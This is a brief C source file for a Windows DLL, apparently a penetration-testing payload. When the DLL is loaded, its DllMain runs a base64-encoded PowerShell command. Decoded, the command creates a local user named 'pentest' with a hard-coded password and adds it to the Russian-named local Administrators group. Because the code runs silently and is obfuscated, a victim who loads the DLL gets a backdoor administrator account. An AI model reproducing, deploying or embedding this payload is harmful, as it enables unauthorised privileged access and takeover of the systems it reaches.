#include <windows.h> 
#pragma comment (lib, "user32.lib") 
BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) { 
    switch (ul_reason_for_call)  { 
    case DLL_PROCESS_ATTACH: 
      system("powershell -enc JAB1AHMAZQByACAAPQAgACcAcABlAG4AdABlAHMAdAAnADsAIAAkAHAAYQBzAHMAdwBvAHIAZAAgAD0AIAAnAEwAawB6AE4AdABjAG4AagBkAF8AMgAyAF8AJwA7ACAAJABnAHIAbwB1AHAAIAA9ACAAJwAQBDQEPAQ4BD0EOARBBEIEQAQwBEIEPgRABEsEJwA7ACAAbgBlAHQAIAB1AHMAZQByACAAJAB1AHMAZQByACAAJABwAGEAcwBzAHcAbwByAGQAIAAvAGEAZABkADsAIABuAGUAdAAgAGwAbwBjAGEAbABnAHIAbwB1AHAAIAAkAGcAcgBvAHUAcAAgACQAdQBzAGUAcgAgAC8AYQBkAGQA");
      break; 
    case DLL_PROCESS_DETACH: 
      break; 
    case DLL_THREAD_ATTACH: 
      break; 
    case DLL_THREAD_DETACH: 
      break; 
    } 
    return TRUE; 
}